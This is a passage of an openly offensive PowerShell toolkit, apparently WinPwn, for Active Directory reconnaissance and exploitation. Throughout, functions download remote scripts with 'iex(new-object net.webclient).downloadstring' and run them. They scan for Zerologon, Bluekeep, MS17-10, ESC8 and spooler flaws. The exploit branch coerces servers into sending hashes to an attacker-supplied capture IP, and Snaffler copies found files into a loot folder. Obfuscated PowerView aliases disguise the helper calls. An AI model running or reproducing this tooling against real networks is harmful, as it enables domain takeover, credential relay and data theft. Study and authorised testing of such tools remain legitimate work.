# For that we check the ms-DS-MachineAccountQuota value which determines how many computer objects can be added.
# We also check who can add computer accounts to the domain by querying the Default Domain Controllers Policy for the SeMachineAccountPrivilege attribute.
# This is not failsafe, especially the latter part.
# If run from a non domain joined system run it using runas:
# runas /netonly /user:DOMAIN.FQDN\USER.NAME powershell

# Proudly brought to you by @LuemmelSec

# If in Domain context we can also just use AD PS cmdlets to query for the quota:
# Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | Get-ADObject -Properties 'ms-DS-MachineAccountQuota'

$mySearcher = New-Object System.DirectoryServices.DirectorySearcher
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
 
# it is possible to specify manually a ldap search Path and provide credentials instead:
#$mySearcher.SearchRoot = "LDAP://DC=DOMAIN,DC=LOCAL",USERNAME,PASSWORD)
 
$mySearcher.SearchRoot = $objDomain
 
# search for object class "domain"
$mySearcher.Filter = "(& (objectClass=domain))"
$mySearcher.SearchScope = "sub"
 
# specifiy the attributes you would like to retrieve
$myAttributes = ("name", "ms-DS-MachineAccountQuota")
$mySearcher.PropertiesToLoad.AddRange($myAttributes)
 
$searchresult = $mySearcher.FindAll()
foreach ($i in $searchresult.Properties.PropertyNames){
    if($i -eq "ms-ds-machineaccountquota"){
    $MAQ= $searchresult.Properties.$i
    }
}

[xml]$GPOXML= Get-GPOReport -Name "Default Domain Controllers Policy" -ReportType Xml
foreach ($p in $GpoXml.GPO.Computer.ExtensionData.Extension.UserRightsAssignment) {
    if($p.name -eq "SeMachineAccountPrivilege"){
    $SeMachineAccountPrivilege = $p.InnerText
    }
}

if(($MAQ -gt 0) -and ($SeMachineAccountPrivilege -match "Authenti")){
    if($consoleoutput){
        Write-Host "### RBCD abusable ### " -ForegroundColor Green
        Write-Host "Users / Groups: $($SeMachineAccountPrivilege -Split("SeMachineAccountPrivilege"))"
        Write-Host "Quota: $($MAQ)"
        }
        else
        {Write-Host "### RBCD abusable ###, Computer Account Creation is allowed for Authenticated Users " >> "$currentPath\Vulnerabilities\RBCD_Possible.txt"}
    }

if(($MAQ -lt 1) -or ($SeMachineAccountPrivilege -notmatch "Authenti")){
    if($consoleoutput){
        Write-Host "### RBCD NOT abusable ### " -ForegroundColor Red
        Write-Host "Users / Groups: $($SeMachineAccountPrivilege -Split("SeMachineAccountPrivilege"))"
        Write-Host "Quota: $($MAQ)"
        }
        else{}
    }
	    
    if(!$consoleoutput){Get-ADUser -Filter {UserAccountControl -band 0x0020} >> "$currentPath\Vulnerabilities\UsersWithoutPasswordPolicy.txt"}else{Write-Host -ForegroundColor Yellow '------->  Users without password policy:';Get-ADUser -Filter {UserAccountControl -band 0x0020}}

    if(!$consoleoutput)
    {
      Get-ADComputer -LDAPFilter "(&(userAccountControl=4128)(logonCount=0))" >> "$currentPath\Vulnerabilities\Pre2000Computers.txt"
    }
    else
    {
      Write-Host -ForegroundColor Yellow '------->  Potentially Pre-Created Computer Accounts with password equal to hostname in lowercase :'
      Get-ADComputer -LDAPFilter "(&(userAccountControl=4128)(logonCount=0))"
    }

# Dictionary to hold superclass names
$superClass = @{}

# List to hold class names that inherit from container and are allowed to live under computer object
$vulnerableSchemas = [System.Collections.Generic.List[string]]::new()

# Resolve schema naming context
$schemaNC = (Get-ADRootDSE).schemaNamingContext

# Enumerate all class schemas
$classSchemas = Get-ADObject -LDAPFilter '(objectClass=classSchema)' -SearchBase $schemaNC -Properties lDAPDisplayName,subClassOf,possSuperiors

# Enumerate all class schemas that computer is allowed to contain
$computerInferiors = $classSchemas |Where-Object possSuperiors -eq 'computer'

# Populate superclass table
$classSchemas |ForEach-Object {
    $superClass[$_.lDAPDisplayName] = $_.subClassOf
}

# Resolve class inheritance for computer inferiors
$computerInferiors |ForEach-Object {
  $class = $cursor = $_.lDAPDisplayName
  while($superClass[$cursor] -notin 'top'){
    if($superClass[$cursor] -eq 'container'){
      $vulnerableSchemas.Add($class)
      break
    }
    $cursor = $superClass[$cursor]
  }
}

# Outpupt list of vulnerable class schemas 
$vulnerableSchemas
if(!$consoleoutput){$vulnerableSchemas >> "$currentPath\Vulnerabilities\VulnerableSchemas.txt"}else{Write-Host -ForegroundColor Yellow '------->  Found vulnerable old Exchange Schema (https://twitter.com/tiraniddo/status/1420754900984631308):';$vulnerableSchemas}

    Write-Host -ForegroundColor Yellow '-------> Searching for Users without password Change for a long time'
  $Date = (Get-Date).AddYears(-1).ToFileTime()
    if(!$consoleoutput){prostituted -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset >> "$currentPath\DomainRecon\Users_Nochangedpassword.txt"}else{prostituted -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset}
	
    if(!$consoleoutput){
      prostituted -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users1.txt"
        prostituted -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname >> "$currentPath\DomainRecon\Enabled_Users2.txt"
  }
    else
    {
        Write-Host -ForegroundColor Yellow '-------> Enabled Users'
        prostituted -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname
    }
    Write-Host -ForegroundColor Yellow '-------> Searching for Unconstrained delegation Systems and Users'
  if(!$consoleoutput){
    $Computers = breviaries -Unconstrained -Properties DnsHostName >> "$currentPath\DomainRecon\Unconstrained_Delegation_Systems.txt"
    $Users = prostituted -AllowDelegation -AdminCount >> "$currentPath\DomainRecon\AllowDelegationUsers.txt"
    $Users.samaccountname >> "$currentPath\DomainRecon\AllowDelegationUsers_samaccountnames_only.txt"     
    }
    else
    {
        Write-Host -ForegroundColor Yellow '-------> Unconstrained delegation Systems'
        $Computers = breviaries -Unconstrained -Properties DnsHostName
        Write-Host -ForegroundColor Yellow '-------> Unconstrained delegation Users'
        $Users = prostituted -AllowDelegation -AdminCount
        $Users.samaccountname
    }
    Write-Host -ForegroundColor Yellow '-------> Identify kerberos and password policy..'
  $DomainPolicy = forsakes -Policy Domain
    if(!$consoleoutput){
    $DomainPolicy.KerberosPolicy >> "$currentPath\DomainRecon\Kerberospolicy.txt"
    $DomainPolicy.SystemAccess >> "$currentPath\DomainRecon\Passwordpolicy.txt"
  }
    else
    {
        $DomainPolicy.KerberosPolicy
        $DomainPolicy.SystemAccess
    }
  Write-Host -ForegroundColor Yellow '-------> Searching for LAPS Administrators'
    if(!$consoleoutput){lapschecks}else{lapschecks -noninteractive -consoleoutput}
	
    Write-Host -ForegroundColor Yellow '-------> Searching for Systems we have RDP access to..'
  if(!$consoleoutput){rewires -LocalGroup RDP -Identity $env:Username -domain $domain  >> "$currentPath\DomainRecon\RDPAccess_Systems.txt"}else{rewires -LocalGroup RDP -Identity $env:Username -domain $domain} 
}

function Invoke-RBDC-over-DAVRPC
{
  <#
        .DESCRIPTION
        Search in AD for pingable Windows servers and Check if they are vulnerable to RBCD via Petitpotam + relay to ldap.
        https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Domain Recon
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    IEX ($viewdevobfs)
    $serversystems = "yes"
    if(!$noninteractive)
    {
        $serversystems = Read-Host -Prompt 'Start DAV RPC Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
    }
    if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
    {
      if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
        {
            Write-Host -ForegroundColor Yellow "Found an existing Server list, using this one instead of generating a new one!"
            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Servers.txt"
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers >> "$currentPath\DomainRecon\Windows_Servers.txt"}
        }
    foreach ($acserver in $ActiveServers)
        {
      try{
             $path = ""
             $path = Get-ChildItem -Path "\\$acserver\pipe\DAV RPC SERVICE"
               if (!($path -eq $null))
               {
                 Write-Host -ForegroundColor Yellow "Found vulnerable Server - " + $acserver + ". If no LDAP Signing is enforced (default config) you can pwn via https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb!"
                 if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\RBCD_Petitpotam_VulnerableServers.txt"}else{Write-Host -ForegroundColor Red $acserver + "is vulnerable to RBCD via Petitpotam LDAP relay!"}
               }
      }catch{}
        }
    }
    else
    {
        if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems.txt")
        {
            Write-Host -ForegroundColor Yellow "Found an existing Windows system list, using this one instead of generating a new one!"
            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Systems.txt"
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers >> "$currentPath\DomainRecon\Windows_Systems.txt"}
        }
    foreach ($acserver in $ActiveServers)
        {
      try{
             $path = ""
             $path = Get-ChildItem -Path "\\$acserver\pipe\DAV RPC SERVICE"
               if (!($path -eq $null))
               {
                    Write-Host -ForegroundColor Yellow "Found vulnerable System - " + $acserver + ". If no LDAP Signing is enforced (default config) you can pwn via https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb!"
                    if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\RBCD_Petitpotam_VulnerableSystems.txt"}else{Write-Host -ForegroundColor Red $acserver + "is vulnerable to RBCD via Petitpotam LDAP relay!"}
               }
      }catch{}
        }
    }

}

function ADCSInfos
{
    Param
    (   
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    iex($admodule)
    $Dom = Get-ADDomain
    Write-Host -ForegroundColor Yellow '-------> Searching AD for ADCS Servers'
    $ServerSearch = "CN=AIA,CN=Public Key Services,CN=Services,CN=Configuration,$Dom"
    $Servers = Get-ADObject -Filter 'ObjectClass -eq "certificationAuthority"' -SearchBase $ServerSearch
    if($consoleoutput){$Servers}else{$Servers >> "$currentPath\DomainRecon\ADCSServer.txt"}

    $SearchCertTemplates = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$Dom"
    Write-Host -ForegroundColor Yellow '-------> Searching AD for ADCS Templates'
    $CertTemplates = Get-ADObject -Filter 'ObjectClass -eq "pKICertificateTemplate"' -SearchBase $SearchCertTemplates
    if($consoleoutput){$CertTemplates}else{$CertTemplates >> "$currentPath\DomainRecon\ADCSTemplates.txt"}

    Write-Host -ForegroundColor Yellow '-------> Searching for the active CA-Server and checking for ESC8 (https://posts.specterops.io/certified-pre-owned-d95910965cd2)'
    foreach ($Server in $servers.name)
    {
        $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
        $FQDN = $Server + "." + $Domain
        try
        {
            $Resolve = Resolve-DNSNAme $FQDN
            $IP = $Resolve.IPAddress
            Write-Host -ForegroundColor Yellow "$FQDN resolves to $IP"
            
            $client = New-Object System.Net.Sockets.TcpClient
            $beginConnect = $client.BeginConnect($FQDN,"80",$null,$null)
            Sleep 2
            if($client.Connected)
            {
                Write-Host -ForegroundColor Yellow "$FQDN has Port 80 opened, maybe vulnerable!"
                if(!$consoleoutput){$FQDN >> "$currentPath\DomainRecon\ADCS_Maybe_ESC8_Vulnerable.txt"}
                try
                {
                    $CertURI = "http://" + $FQDN + "/certsrv/certfnsh.asp" 
                    $WebResponse = iwr  -UseDefaultCredentials -MaximumRedirection 1 -uri $CertURI
                    if ($WebResponse.Content -Match "Active Directory Certificate Services")
                    {
                        Write-Host -ForegroundColor Red "$FQDN serves certificates over HTTP or has only redirects to HTTPS and is therefore ESC8 vulnerable!"
                        if(!$consoleoutput){$FQDN >> "$currentPath\Vulnerabilities\ADCS_ESC8_Vulnerable.txt"}
                    }
                    else
                    {
                        Write-Host -ForegroundColor Yellow "$FQDN hosts a Webserver over HTTP but doesn't match the ADCS content, check that manually!"
                    }
                }
                catch
                {
                    Write-Host -ForegroundColor Yellow "Not able to connect to $CertURI, maybe the current user is not authorized"
                }
                $client.Close()

            }
            else
            {
                Write-Host -ForegroundColor Yellow "$FQDN has Port 80 closed, still checking 443 as the server can be vulnerable if channel binding is disabled!"
                $client = New-Object System.Net.Sockets.TcpClient
                $beginConnect = $client.BeginConnect($FQDN,"443",$null,$null)
                Sleep 2
                if($client.Connected)
                {
                    Write-Host -ForegroundColor Yellow "$FQDN has Port 443 opened, maybe vulnerable!"
                    if(!$consoleoutput){$FQDN >> "$currentPath\DomainRecon\ADCS_Maybe_ESC8_HTTPS_Vulnerable.txt"}
                    try
                    {
                        $CertURI = "https://" + $FQDN + "/certsrv/certfnsh.asp" 
                        $WebResponse = iwr  -UseDefaultCredentials -MaximumRedirection 0 -uri $CertURI
                        if ($WebResponse.Content -Match "Active Directory Certificate Services")
                        {
                            Write-Host -ForegroundColor Red "$FQDN serves certificates over HTTPS and is therefore potentially ESC8 vulnerable!"
                            if(!$consoleoutput){$FQDN >> "$currentPath\Vulnerabilities\ADCS_ESC8_HTTPS_Vulnerable.txt"}
                        }
                        else
                        {
                            Write-Host -ForegroundColor Yellow "$FQDN hosts a Webserver over HTTPS but doesn't match the ADCS content, check that manually!"
                        }
                    }
                    catch
                    {
                        Write-Host -ForegroundColor Yellow "Not able to connect to $CertURI, maybe the current user is not authorized"
                    }
                    $client.Close()

               }
            }
            
            
        }
        catch
        {
            Write-Host -ForegroundColor Yellow "$FQDN cannot be resolved"
        }
    }
}

function Domainshares
{
  @'

             
__        ___       ____                 
\ \      / (_)_ __ |  _ \__      ___ __  
 \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
  \ V  V / | | | | |  __/ \ V  V /| | | |
   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|

   --> DomainShares @S3cur3Th1sSh1t

'@
    do
    {
        Write-Host "================ WinPwn ================"
        Write-Host -ForegroundColor Green '1. Passhunt search for Powerview found shares!'
        Write-Host -ForegroundColor Green '2. Run Snaffler! '
        Write-Host -ForegroundColor Green '3. Go back '
        Write-Host "================ WinPwn ================"
        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'

        Switch ($masterquestion) 
        {
             1{passhunt -domain $true}
             2{Snaffler}
       }
    }
  While ($masterquestion -ne 3)

}

function Snaffler
{
    # @l0ss and @Sh3r4 - snaffler
    [CmdletBinding()]

    Param
    (   
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Snaffler.ps1')
    if (!$noninteractive)
    {
        Write-Host -ForegroundColor Yellow "Get a copy of all found files to the loot folder?"
        $answer = Read-Host
      if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
      {
        mkdir $currentPath\LootFiles
              if(!$consoleoutput){Invoke-Snaffler -command "-u -s -m $currentPath\LootFiles\ -o $currentPath\DomainRecon\Snaffler.txt"}else{Invoke-Snaffler -command "-u -s -m $currentPath\LootFiles\"}
      }
      else
      {
        if(!$consoleoutput){Invoke-Snaffler -command "-u -s -o $currentPath\DomainRecon\Snaffler.txt"}else{Invoke-Snaffler -command "-u -s "}
      }
    }
    else
    {
      Invoke-Snaffler -command "-u"
    }
}

function oxidresolver
{
    [CmdletBinding()]

    Param
    (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput
    )
    iex(new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-OxidResolver.ps1')
    if(!$consoleoutput){pathcheck}
    if(!$consoleoutput){Invoke-Oxidresolver >> "$currentPath\DomainRecon\OxidBindings.txt"}
    else{Invoke-Oxidresolver}

}

function Spoolvulnscan
{
    #leechristensens Spoolsample scanner & Exploitation

    [CmdletBinding()]

    Param
    (   
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput,
        [Switch]
        $exploit,
        [String]
        $captureIP

    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    if (!$exploit)
    {   
        IEX ($viewdevobfs)         
      Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service!' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
        iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/SpoolerScanner/master/SpoolerScan.ps1')
        $domcontrols = spinster
        
        
        foreach ($domc in $domcontrols.IPAddress)
        {
            if(!$consoleoutput){$domc > "$currentPath\DomainRecon\DC-IPs.txt"}
        try{
                   if (spoolscan -target $domc)
                   {
                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now / or maybe NTLMv1 downgrade (https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)'
                            if(!$consoleoutput){echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"}else{Write-Host -ForegroundColor Red "$domc is vulnerable"}
                   }
         }
               catch
               {
                    Write-Host "Got an error"
               }
        }
        $othersystems = "no"
    if (!$noninteractive)
        {
            $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'
        }
        if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
        {
          Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
          foreach ($acserver in $ActiveServers.dnshostname)
                {
            try{
                          if (spoolscan -target $acserver)
                          {
                                Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. You can take the Computer-Account Hash for SMB-Relay attacks / or maybe NTLMv1 downgrade (https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)"
                                if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"}else{Write-Host "$acserver is vulnerable";$servers += $acserver}
                          }
                }catch{Write-Host "Got an error"}
                }
        }
        if (!$noninteractive)
        {
             Write-Host -ForegroundColor Yellow "Relay hashes from all vulnerable servers?"
             $answer = Read-Host
        }
        else
        {$answer = "no"}
    }
    if ($exploit){$answer = "yes"}
    if ($answer -eq "yes" -or $answer -eq "y" -or $answer -eq "Yes" -or $answer -eq "Y")
    {
              if (($captureIP -eq "") -and ($noninteractive))
              {
                Write-Host -ForegroundColor Yellow "You have to specify an hash capturing IP-Adress via -captureIP parameter!"
      return
              }
              elseif($captureIP -eq "")
              {
                 Write-Host -ForegroundColor Yellow "Please enter the hash capturing IP-Adress:"
                 $captureIP = Read-Host
              }
              IEX (New-Object Net.WebClient).DownloadString($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Spoolsample.ps1')
              if(!$consoleoutput)
              {
                if (test-path "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt")
                {
                       $servers = get-content "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"
                       foreach ($server in $servers)
                       {
                             Write-Host -ForegroundColor Yellow "Spool sampling $server"
                             Invoke-SpoolSample -command "$server $captureip"
                       }
                }
                if (test-path "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt")
                {
                   $servers = get-content "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"
                    foreach ($server in $servers)
                    {
                         Write-Host -ForegroundColor Yellow "Spool sampling $server"
                         Invoke-SpoolSample -command "$server $captureip"
                    }
                }
              }
              else
              {
                   foreach ($server in $servers)
                   {
                         Write-Host -ForegroundColor Yellow "Spool sampling $server"
                         Invoke-SpoolSample -command "$server $captureip"
                   }
              }
    }
}
                    

function GPORemoteAccessPolicy
{
    # Stolen from https://github.com/FSecureLABS
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpGPO-RemoteAccessPolicies.ps1')
    if(!$consoleoutput){Invoke-SharpGPO-RemoteAccessPolicies >> $currentPath\DomainRecon\GPO-RemoteAccess.txt}else{Invoke-SharpGPO-RemoteAccessPolicies}
    if (($noninteractive) -and (!$consoleoutput))
    {
        Get-Content $currentPath\DomainRecon\GPO-RemoteAccess.txt
        pause;
    }
}
function RBCD-Check
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Get-RBCD-Threaded.ps1')
    $Domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name
    if(!$consoleoutput){Invoke-Get-RBCD-Threaded -Command "-s -d $Domain" >> $currentPath\DomainRecon\ResourceBasedConstrainedDelegation-Check.txt}else{Invoke-Get-RBCD-Threaded -Command "-s -d $Domain"}
    if (($noninteractive) -and (!$consoleoutput))
    {
        Get-Content $currentPath\DomainRecon\ResourceBasedConstrainedDelegation-Check.txt
        pause;
    }
}

function Printercheck
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpPrinter.ps1')
    if(!$consoleoutput){Invoke-SharpPrinter >> $currentPath\DomainRecon\printercheck.txt}else{Invoke-SharpPrinter}
    if($noninteractive -and (!$consoleoutput)){
        Get-Content $currentPath\DomainRecon\printercheck.txt
        pause;
    }
}
function GPOAudit
{
  <#
        .DESCRIPTION
        Check Group Policies for common misconfigurations using Grouper2 from l0ss.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Domain Recon
        [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )

    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    # todo interactive + consoleoutput
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Grouper2.ps1')
    Invoke-Grouper2 -command "-i 4 -f $currentPath\DomainRecon\GPOAudit.html"
}

function Grouper3
{
  <#
        .DESCRIPTION
        Check Group Policies for common misconfigurations using Grouper3 from l0ss.
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Domain Recon
        [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )

    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    # todo interactive + consoleoutput
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/PowerSharpPack/master/PowerSharpBinaries/Invoke-Grouper3.ps1')
    Invoke-Grouper3 -command "-a 2 -f $currentPath\DomainRecon\Grouper3.log"
}


function reconAD
{
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )

    # sense-of-security - ADRecon
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
    IEX (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ADRecon.ps1')
}

function Bluekeep
{
  <#
        .DESCRIPTION
        Search AD for pingable Windows servers and Check if they are vulnerable to bluekeep. Original script by https://github.com/vletoux @Pingcastle
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement / Exploitation Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )

    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    IEX (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/bluekeepscan.ps1')
    IEX ($viewdevobfs)
    $serversystems = "yes"
    if (!$noninteractive){$serversystems = Read-Host -Prompt 'Start Bluekeep Scan for Windows Servers only (alternatively we can scan all Windows 7 Clients)? (yes/no)'}
    if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
    {
      if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
        {
              Write-Host -ForegroundColor Yellow "Found an existing Server list, using this one instead of generating a new one!"
             $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Servers.txt"
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers >> "$currentPath\DomainRecon\Windows_Servers.txt"}
        }
      foreach ($acserver in $ActiveServers)
        {
      try{
          if (bluekeepscan -target $acserver)
                {
                  Write-Host -ForegroundColor Yellow 'Found vulnerable Server, putting it to .\VUlnerabilities\bluekeep_VulnerableServers.txt!'
                    if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\bluekeep_VulnerableServers.txt"}else{Write-Host -ForegroundColor red "$acserver is vulnerable"}
                }
      }catch{Write-Host "Got an error"}
        }
    }
    else
    {
        if(Test-Path -Path "$currentPath\DomainRecon\Windows_Systems.txt")
        {
            Write-Host -ForegroundColor Yellow "Found an existing Windows system list, using this one instead of generating a new one!"
            $ActiveServers = Get-Content "$currentPath\DomainRecon\Windows_Systems.txt"
        }
        else
        {
            Write-Host -ForegroundColor Yellow 'Searching every windows system in the domain, this can take a while depending on the domain size'
          $ActiveServers = breviaries -Ping -OperatingSystem "Windows*"
            $ActiveServers = $ActiveServers.dnshostname
            if(!$consoleoutput){$ActiveServers >> "$currentPath\DomainRecon\Windows_Systems.txt"}
        }
      foreach ($acserver in $ActiveServers)
            {
        try{
              if (bluekeepscan -target $acserver)
                    {
                      Write-Host -ForegroundColor Yellow "Found vulnerable System - $acserver. Just Pwn it!"
                        if(!$consoleoutput){echo "$acserver" >> "$currentPath\Vulnerabilities\bluekeep_VulnerableSystems.txt"}else{Write-Host -ForegroundColor Red "$acserver is vulnerable"}
                    }
        }catch{Write-Host "Got an error"}
        }
    }

}

function zerologon
{
  <#
        .DESCRIPTION
        Search in AD for Zerologon vulnerable DCs
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
    IEX ($viewdevobfs)         
  Write-Host -ForegroundColor Yellow 'Searching for zerologon vulnerable Domain Controllers - if vulnerable you can pwn everything in 5 minutes.' 
    iex (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/Invoke-Zerologon.ps1')
    $domcontrols = spinster
        
        
    foreach ($domc in $domcontrols.name)
    {
        if(!$consoleoutput){$domc > "$currentPath\DomainRecon\DC-FQDN.txt"}
    try{


                $Results = Invoke-Zerologon -fqdn $domc

                if (!($Results -eq $null))
                {
                    Write-Host "Found vulnerable DC: " 
                    $domc
                    if(!$consoleoutput){$domc >> "$currentPath\Vulnerabilities\ZerologonvulnerableDC.txt"}

                }
         }
           catch
           {
                Write-Host "Got an error"
           }
    }

}

function MS17-10
{
  <#
        .DESCRIPTION
        Search in AD for pingable Windows servers and Check if they are vulnerable to MS17-10. Original script by https://github.com/vletoux @PingCastle
        Author: @S3cur3Th1sSh1t
        License: BSD 3-Clause
    #>
    #Domain Recon / Lateral Movement / Exploitation Phase
    [CmdletBinding()]
    Param (
        [Switch]
        $noninteractive,
        [Switch]
        $consoleoutput   
    )
    if(!$consoleoutput){pathcheck}
    $currentPath = (Get-Item -Path ".\" -Verbose).FullName

    IEX (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ms17-10.ps1')
    IEX ($viewdevobfs)
    $serversystems = "yes"
    if(!$noninteractive)
    {
        $serversystems = Read-Host -Prompt 'Start MS17-10 Scan for Windows Servers only (alternatively we can scan all Servers + Clients but this can take a while)? (yes/no)'
    }
    if ($serversystems -eq "yes" -or $serversystems -eq "y" -or $serversystems -eq "Yes" -or $serversystems -eq "Y")
    {
      if(Test-Path -Path "$currentPath\DomainRecon\Windows_Servers.txt")
        {
